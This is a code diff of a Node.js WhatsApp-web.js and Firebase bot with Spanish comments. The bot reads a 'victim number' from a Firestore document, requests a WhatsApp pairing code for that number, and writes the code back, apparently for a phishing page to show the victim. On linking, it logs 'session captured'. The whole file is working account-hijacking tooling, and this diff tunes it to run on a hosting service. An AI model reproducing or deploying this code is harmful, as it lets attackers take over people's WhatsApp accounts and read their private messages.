@@ -6,45 +6,56 @@ const serviceAccount = require("./serviceAccountKey.json");
 if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
 const db = admin.firestore();
 
-// EL TRUCO: Cliente con ID único para cada reinicio
 const client = new Client({
-    authStrategy: new LocalAuth({ clientId: "session_" + Date.now() }), 
+    authStrategy: new LocalAuth({ clientId: "master_session" }),
     puppeteer: {
         headless: true,
-        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
+        executablePath: '/usr/bin/google-chrome-stable',
+        args: [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-accelerated-2d-canvas',
+            '--no-first-run',
+            '--no-zygote',
+            '--single-process',
+            '--disable-gpu'
+        ]
     }
 });
 
-// ESCUCHA AGRESIVA: Detecta el número y pide código el código REAL
+// Bloquear recursos innecesarios para ahorrar RAM en Render
+async function optimizarPagina(page) {
+    await page.setRequestInterception(true);
+    page.on('request', (ds) => {
+        if (['image', 'stylesheet', 'font', 'media'].includes(ds.resourceType())) {
+            ds.abort();
+        } else {
+            ds.continue();
+        }
+    });
+}
+
 db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
     if (!snap.exists) return;
     const data = snap.data();
-
-    // Solo actuamos si hay número y el código está vacío
     if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
-        console.log(">>> [LOG] SOLICITANDO CÓDIGO PARA: " + data.numero_victima);
+        console.log("PROCESANDO: " + data.numero_victima);
         try {
             const code = await client.requestPairingCode(data.numero_victima);
-            console.log(">>> [LOG] CÓDIGO GENERADO: " + code);
-            
-            await snap.ref.update({
-                pairingCode: code,
-                status: "mostrando_codigo"
-            });
-        } catch (err) {
-            console.log(">>> [LOG] ERROR: " + err.message);
-            // Si falla, reseteamos para que la víctima pueda reintentar
-            await snap.ref.update({ pairingCode: "ERROR", status: "error" });
+            console.log("EXITO: " + code);
+            await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
+        } catch (e) {
+            console.log("ERROR: " + e.message);
+            await snap.ref.update({ status: "error" });
         }
     }
 });
 
 client.on('ready', () => {
-    console.log(">>> [LOG] VÍCTIMA VINCULADA EXITOSAMENTE");
+    console.log("SESIÓN CAPTURADA");
     db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
 });
 
-client.initialize().catch(e => console.log(">>> [LOG] Error Init:", e));
-
-const port = process.env.PORT || 3000;
-http.createServer((req, res) => { res.end('MOTOR ONLINE'); }).listen(port);
+client.initialize();
+http.createServer((req, res) => { res.end('ONLINE'); }).listen(process.env.PORT || 3000);
